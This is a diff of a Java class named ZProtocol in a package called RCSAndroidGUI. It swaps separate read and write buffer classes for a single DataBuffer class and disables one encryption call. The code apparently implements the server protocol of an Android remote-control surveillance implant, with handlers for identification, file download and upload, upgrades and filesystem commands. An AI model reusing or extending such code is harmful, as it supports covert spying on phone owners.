@@ -20,8 +20,7 @@ import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
 import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataReadBuffer;
-import com.ht.RCSAndroidGUI.utils.DataWriteBuffer;
+import com.ht.RCSAndroidGUI.utils.DataBuffer;
 import com.ht.RCSAndroidGUI.utils.Utils;
 import com.ht.RCSAndroidGUI.utils.WChar;
 
@@ -185,7 +184,7 @@ public class ZProtocol extends Protocol {
         Keys keys = Encryption.getKeys();
 
         byte[] data = new byte[104];
-        DataWriteBuffer dataBuffer = new DataWriteBuffer(data, 0, data.length);
+        DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);
 
         // filling structure
         dataBuffer.write(Kd);
@@ -327,7 +326,7 @@ public class ZProtocol extends Protocol {
 
         byte[] content = new byte[len];
 
-        DataWriteBuffer dataBuffer = new DataWriteBuffer(content, 0, content.length
+        DataBuffer dataBuffer = new DataBuffer(content, 0, content.length
                );
         //dataBuffer.writeInt(Proto.ID);
         dataBuffer.write(device.getVersion());
@@ -356,7 +355,7 @@ public class ZProtocol extends Protocol {
             debug.info("got Identification");
             //#endif
 
-            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4);
             try {
                 // la totSize e' discutibile
@@ -444,7 +443,7 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseDownload, OK");
             //#endif
-            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4);
             try {
                 // la totSize e' discutibile
@@ -492,7 +491,7 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseUpload, OK");
             //#endif
-            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
@@ -542,7 +541,7 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseUpgrade, OK");
             //#endif
-            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
@@ -599,7 +598,7 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseFileSystem, OK");
             //#endif
-            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
@@ -731,7 +730,7 @@ public class ZProtocol extends Protocol {
         try {
             byte[] plainIn;
             //#ifdef ZNOSHA
-            plainIn = cypheredWriteRead(plainOut);
+            //plainIn = cypheredWriteRead(plainOut);
             //#else
             plainIn = cypheredWriteReadSha(plainOut);
             //#endif
